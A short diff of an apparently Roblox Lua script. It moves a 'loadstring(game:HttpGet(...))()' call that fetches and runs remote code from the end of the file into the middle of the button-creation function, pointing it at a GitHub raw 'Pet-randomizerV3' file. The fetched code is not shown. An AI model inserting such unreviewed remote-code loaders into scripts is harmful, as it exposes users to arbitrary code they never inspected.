@@ -138,7 +138,7 @@ local function createButton()
         if visible then
             update()
         end
-
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/noobneil1/Pet-randomizerV3/refs/heads/main/Pet-randomizerrr3"))()
         -- Countdown coroutine
         coroutine.wrap(function()
             for i = 29, 1, -1 do
@@ -163,4 +163,4 @@ while true do
         clearAll()
     end
 end
-loadstring(game:HttpGet("https://pastefy.app/1ACVA0ub/raw"))()
+
